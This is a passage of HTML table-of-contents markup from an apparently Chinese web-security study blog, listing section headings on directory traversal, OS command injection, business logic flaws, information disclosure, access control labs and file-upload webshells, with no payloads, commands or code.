href="#%E4%BF%9D%E6%8C%81%E7%99%BB%E5%BD%95%E7%9A%84cookie"><span class="toc-number">2.1.3.1.1.</span> <span class="toc-text">保持登录的cookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.1.3.1.2.</span> <span class="toc-text">离线密码破解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">重置用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8url%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.3.2.1.</span> <span class="toc-text">使用url重置密码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">通过更改密码暴力破解密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">3.</span> <span class="toc-text">目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%A1%88%E4%BE%8B"><span class="toc-number">3.1.</span> <span class="toc-text">简单案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9A%9C%E7%A2%8D"><span class="toc-number">3.2.</span> <span class="toc-text">利用文件路径遍历漏洞的常见障碍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87%E5%AF%B9%E8%BF%94%E5%9B%9E%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E7%AC%A6%E7%9A%84%E7%A6%81%E7%94%A8"><span class="toc-number">3.2.1.</span> <span class="toc-text">利用绝对路径绕过对返回上级目录符的禁用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E7%BB%95%E8%BF%87%E5%8D%95%E6%AC%A1%E6%B6%88%E9%99%A4%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">3.2.2.</span> <span class="toc-text">嵌套遍历序列绕过单次消除目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.3.</span> <span class="toc-text">二次编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E8%B7%AF%E5%BE%84%E5%89%8D%E7%BC%80"><span class="toc-number">3.2.4.</span> <span class="toc-text">固定路径前缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E6%8E%A7%E5%88%B6"><span class="toc-number">3.2.5.</span> <span class="toc-text">空字节截断路径绕过后缀控制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">防止目录遍历攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">os命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%A1%88%E4%BE%8B-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">简单案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">OS命令盲注漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%BB%B6%E6%97%B6%E6%A3%80%E6%B5%8BOS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.1.</span> <span class="toc-text">利用延时检测OS命令盲注漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E6%9C%89%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9A%84%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">具有时间延迟的盲操作系统命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%87%8D%E5%AE%9A%E5%90%91%E8%BE%93%E5%87%BA%E6%9D%A5%E5%88%A9%E7%94%A8%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">通过重定向输出来利用盲操作系统命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%A4%96-OAST-%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8%E7%9B%B2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.3.</span> <span class="toc-text">使用带外 (  OAST  ) 技术利用盲操作系统命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B8%97%E6%BC%8F%E7%9A%84%E7%9B%B2%E7%9B%AE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.1.4.</span> <span class="toc-text">带外数据渗漏的盲目操作系统命令注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">业务逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E5%BA%A6%E4%BF%A1%E4%BB%BB%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%A7%E5%88%B6%EF%BC%88%E6%94%AF%E4%BB%98%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">过度信任客户端控制（支付）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E9%9D%9E%E5%B8%B8%E8%A7%84%E8%BE%93%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">无法处理非常规输入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B4%9F%E4%BB%B7%E6%A0%BC%E6%8A%B5%E6%B6%88"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">利用负价格抵消</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E9%87%8F%E6%BA%A2%E5%87%BA%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.2.0.2.</span> <span class="toc-text">数量溢出逻辑漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E5%BC%82%E5%B8%B8%E8%BE%93%E5%85%A5%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8D%E4%B8%80%E8%87%B4"><span class="toc-number">5.2.0.3.</span> <span class="toc-text">对异常输入的处理不一致</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%81%9A%E5%87%BA%E9%94%99%E8%AF%AF%E7%9A%84%E5%81%87%E8%AE%BE"><span class="toc-number">5.3.</span> <span class="toc-text">对用户行为做出错误的假设</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E7%94%A8%E6%88%B7%E5%B9%B6%E4%B8%8D%E6%80%BB%E6%98%AF%E5%80%BC%E5%BE%97%E4%BF%A1%E8%B5%96"><span class="toc-number">5.3.1.</span> <span class="toc-text">受信任的用户并不总是值得信赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E4%B8%80%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6"><span class="toc-number">5.3.2.</span> <span class="toc-text">不一致的安全控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%A1%AB%E5%86%99%E5%8F%AF%E8%83%BD%E4%B8%8D%E6%98%AF%E5%BF%85%E9%80%89%E9%A1%B9"><span class="toc-number">5.3.3.</span> <span class="toc-text">用户填写可能不是必选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%94%A8%E9%80%94%E7%9A%84%E7%AB%AF%E7%82%B9%E4%B9%8B%E9%97%B4%E7%9A%84%E5%BC%B1%E9%9A%94%E7%A6%BB"><span class="toc-number">5.3.4.</span> <span class="toc-text">多用途的端点之间的弱隔离</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8D%E4%BC%9A%E6%80%BB%E6%98%AF%E9%81%B5%E5%BE%AA%E9%A2%84%E6%9C%9F%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-number">5.4.</span> <span class="toc-text">用户不会总是遵循预期的顺序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E9%AA%8C%E8%AF%81%E4%B8%8D%E8%B6%B3"><span class="toc-number">5.4.1.</span> <span class="toc-text">工作流程验证不足</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E7%8A%B6%E6%80%81%E6%9C%BA%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.4.2.</span> <span class="toc-text">通过有缺陷的状态机绕过身份验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%AE%9A%E9%A2%86%E5%9F%9F%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">5.5.</span> <span class="toc-text">特定领域的缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E4%B8%9A%E5%8A%A1%E8%A7%84%E5%88%99%E6%89%A7%E8%A1%8C"><span class="toc-number">5.5.1.</span> <span class="toc-text">有缺陷的业务规则执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%99%90%E9%87%91%E9%92%B1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.5.2.</span> <span class="toc-text">无限金钱逻辑漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E4%BE%9B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%8E%A5%E5%8F%A3"><span class="toc-number">5.6.</span> <span class="toc-text">提供加解密接口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8A%A0%E5%AF%86oracle%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.6.1.</span> <span class="toc-text">通过加密oracle绕过身份验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">信息泄露漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%8A%AB%E9%9C%B2%E5%B8%B8%E8%A7%81%E6%9D%A5%E6%BA%90"><span class="toc-number">6.1.</span> <span class="toc-text">信息披露常见来源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.1.</span> <span class="toc-text">网络爬虫文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">目录列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E8%80%85%E8%AF%84%E8%AE%BA"><span class="toc-number">6.1.3.</span> <span class="toc-text">开发者评论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF"><span class="toc-number">6.1.4.</span> <span class="toc-text">错误信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">6.1.4.1.</span> <span class="toc-text">错误消息中的信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%95%B0%E6%8D%AE"><span class="toc-number">6.1.5.</span> <span class="toc-text">调试数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">6.1.5.1.</span> <span class="toc-text">调试页面信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E9%A1%B5%E9%9D%A2"><span class="toc-number">6.1.6.</span> <span class="toc-text">用户账户页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">6.1.7.</span> <span class="toc-text">通过备份文件泄露源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">6.1.8.</span> <span class="toc-text">不安全配置导致信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%8E%86%E5%8F%B2"><span class="toc-number">6.1.9.</span> <span class="toc-text">版本控制历史</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">如何发现和利用信息泄露漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.1.</span> <span class="toc-text">如何测试信息泄露漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%8A%AB%E9%9C%B2%E7%9A%84%E5%B8%B8%E8%A7%81%E6%9D%A5%E6%BA%90"><span class="toc-number">7.2.</span> <span class="toc-text">信息披露的常见来源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%96%87%E4%BB%B6-1"><span class="toc-number">7.2.1.</span> <span class="toc-text">网络爬虫文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%88%97%E8%A1%A8-1"><span class="toc-number">7.2.2.</span> <span class="toc-text">目录列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E8%80%85%E8%AF%84%E8%AE%BA-1"><span class="toc-number">7.2.3.</span> <span class="toc-text">开发者评论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF-1"><span class="toc-number">7.2.4.</span> <span class="toc-text">错误信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%95%B0%E6%8D%AE-1"><span class="toc-number">7.2.5.</span> <span class="toc-text">调试数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E9%A1%B5%E9%9D%A2"><span class="toc-number">7.2.6.</span> <span class="toc-text">用户帐户页面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%9B%B4%E5%A4%9A"><span class="toc-number">7.2.6.1.</span> <span class="toc-text">阅读更多</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BA%90%E4%BB%A3%E7%A0%81-1"><span class="toc-number">7.2.7.</span> <span class="toc-text">通过备份文件泄露源代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%9B%B4%E5%A4%9A-1"><span class="toc-number">7.2.7.1.</span> <span class="toc-text">阅读更多</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1"><span class="toc-number">7.2.8.</span> <span class="toc-text">不安全配置导致信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%8E%86%E5%8F%B2-1"><span class="toc-number">7.2.9.</span> <span class="toc-text">版本控制历史</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Access-control-vulnerabilities-and-privilege-escalation"><span class="toc-number">8.</span> <span class="toc-text">Access control vulnerabilities and privilege escalation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%EF%BC%88%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">（访问控制漏洞和权限提升）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E6%8F%90%E6%9D%83"><span class="toc-number">9.1.</span> <span class="toc-text">垂直提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB%EF%BC%9A%E6%9C%AA%E5%8F%97%E4%BF%9D%E6%8A%A4%E7%9A%84%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD"><span class="toc-number">9.1.0.1.</span> <span class="toc-text">LAB：未受保护的管理功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB%EF%BC%9A%E5%85%B7%E6%9C%89%E4%B8%8D%E5%8F%AF%E9%A2%84%E6%B5%8B%E7%9A%84-URL-%E7%9A%84%E6%9C%AA%E5%8F%97%E4%BF%9D%E6%8A%A4%E7%9A%84%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD"><span class="toc-number">9.1.0.2.</span> <span class="toc-text">LAB：具有不可预测的 URL 的未受保护的管理功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8F%82%E6%95%B0%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95"><span class="toc-number">9.1.1.</span> <span class="toc-text">基于参数的访问控制方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E7%94%B1%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6"><span class="toc-number">9.1.1.1.</span> <span class="toc-text">LAB:  用户角色由请求参数控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E4%BF%AE%E6%94%B9"><span class="toc-number">9.1.1.2.</span> <span class="toc-text">LAB:用户角色可以在用户配置文件中修改</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B3%E5%8F%B0%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%A4%B1%E6%95%88"><span class="toc-number">9.1.2.</span> <span class="toc-text">平台配置错误导致访问控制失效</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%8F%AF%E4%BB%A5%E8%A7%84%E9%81%BF%E5%9F%BA%E4%BA%8E-URL-%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">9.1.2.1.</span> <span class="toc-text">LAB: 可以规避基于 URL 的访问控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E6%96%B9%E6%B3%95%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">9.1.2.2.</span> <span class="toc-text">LAB: 可以绕过基于方法的访问控制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E8%B6%8A%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">横向越权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6%E7%94%A8%E6%88%B7ID"><span class="toc-number">9.2.0.1.</span> <span class="toc-text">LAB: 请求参数控制用户ID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E7%94%A8%E6%88%B7ID%E5%8F%97%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6%EF%BC%8C%E4%B8%8D%E5%8F%AF%E9%A2%84%E6%B5%8B"><span class="toc-number">9.2.0.2.</span> <span class="toc-text">LAB: 用户ID受请求参数控制，不可预测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E7%94%A8%E6%88%B7-ID-%E5%8F%97%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6%EF%BC%8C%E5%9C%A8%E9%87%8D%E5%AE%9A%E5%90%91%E4%B8%AD%E5%8F%91%E7%94%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E6%BC%8F"><span class="toc-number">9.2.0.3.</span> <span class="toc-text">LAB: 用户 ID 受请求参数控制，在重定向中发生数据泄漏</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E5%88%B0%E5%9E%82%E7%9B%B4%E7%9A%84%E7%89%B9%E6%9D%83%E5%8D%87%E7%BA%A7"><span class="toc-number">9.3.</span> <span class="toc-text">水平到垂直的特权升级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E7%94%B1%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6%E7%9A%84%E7%94%A8%E6%88%B7-ID%EF%BC%8C%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">9.3.0.1.</span> <span class="toc-text">LAB: 由请求参数控制的用户 ID，密码泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8-IDOR"><span class="toc-number">9.3.1.</span> <span class="toc-text">不安全的直接对象引用(IDOR)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8"><span class="toc-number">9.3.1.1.</span> <span class="toc-text">LAB: 不安全的直接对象引用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E6%AD%A5%E9%AA%A4%E6%B5%81%E7%A8%8B%E4%B8%AD%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.3.2.</span> <span class="toc-text">多步骤流程中的访问控制漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%A4%9A%E6%AD%A5%E6%B5%81%E7%A8%8B%EF%BC%8C%E4%B8%80%E6%AD%A5%E6%97%A0%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">9.3.2.1.</span> <span class="toc-text">LAB: 多步流程，一步无访问控制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-Referer-%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">9.3.3.</span> <span class="toc-text">基于 Referer 的访问控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E5%9F%BA%E4%BA%8E-Referer-%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">9.3.3.1.</span> <span class="toc-text">LAB: 基于 Referer 的访问控制</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">10.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E5%AF%B9%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%9F"><span class="toc-number">10.1.</span> <span class="toc-text">Web服务器如何处理对静态文件的请求？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9D%A5%E9%83%A8%E7%BD%B2-webshell"><span class="toc-number">10.2.</span> <span class="toc-text">利用不受限制的文件上传来部署 webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E9%80%9A%E8%BF%87-web-shell-%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">10.2.0.1.</span> <span class="toc-text">LAB: 通过 web shell 上传远程代码执行</span></a></li></ol></li></ol></li><li 